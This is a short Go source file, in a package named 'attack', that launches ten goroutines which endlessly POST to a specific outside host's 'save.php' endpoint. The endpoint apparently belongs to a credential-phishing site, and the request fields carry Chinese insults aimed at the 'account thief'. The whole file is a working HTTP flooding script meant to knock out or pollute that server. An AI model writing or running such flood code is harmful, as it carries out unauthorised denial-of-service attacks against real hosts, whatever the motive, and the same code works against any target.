package attack

import (
	"github.com/parnurzeal/gorequest"
)

func Run() {
	for i := 0; i < 10; i++ {
		go func() {
			for {
				_, _, errs := gorequest.New().Post(`http://st.z.1a.cm/save.php?u=傻逼盗号&p=这点技术水平`).End()
				if len(errs) != 0 {
					continue
				}
				//fmt.Println(resp.StatusCode)
			}
		}()
	}
}
